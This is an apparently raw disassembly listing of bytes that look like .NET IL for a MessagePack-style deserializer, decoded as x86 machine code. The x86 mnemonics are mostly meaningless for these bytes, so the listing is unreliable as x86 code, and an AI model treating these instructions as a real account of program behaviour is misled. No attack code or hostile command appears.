  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 82             	add    %dh,-0x7e(%edx)
  404e78:	27                   	daa
  404e79:	00 70 73             	add    %dh,0x73(%eax)
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 ae             	add    %dh,-0x52(%edx)
  404f7d:	27                   	daa
  404f7e:	00 70 73             	add    %dh,0x73(%eax)
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
